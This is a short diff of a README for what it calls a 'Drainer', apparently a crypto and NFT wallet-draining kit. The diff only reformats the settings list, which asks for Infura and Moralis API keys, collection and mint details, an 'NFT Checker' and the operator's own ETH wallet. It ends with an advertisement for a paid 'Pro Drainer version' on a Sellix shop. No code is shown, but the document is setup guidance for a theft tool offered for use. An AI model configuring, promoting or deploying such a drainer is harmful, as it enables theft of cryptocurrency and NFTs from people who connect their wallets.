@@ -12,12 +12,12 @@ Recently, cases of theft of collections of NFTs and cryptocurrencies have become
 
 ## 💠 Variables (settings.js)
 
-- infuraId - Get infura API key - infura.io
-- moralisApi - Get moralis API key - admin.moralis.io/web3apis (v2)
-- collectionInfo - Information about your collection
-- address - Your ETH wallet
-- mintInfo - Mint commission, total supply of NFT and etc
-- nftsInfo - NFT Checker
+- `infuraId` - Get infura API key - infura.io
+- `moralisApi` - Get moralis API key - admin.moralis.io/web3apis (v2)
+- `collectionInfo` - Information about your collection
+- `address` - Your ETH wallet
+- `mintInfo` - Mint commission, total supply of NFT and etc
+- `nftsInfo` - NFT Checker
 
 > :star: **Pro Drainer version available at https://japancode.sellix.io**
 
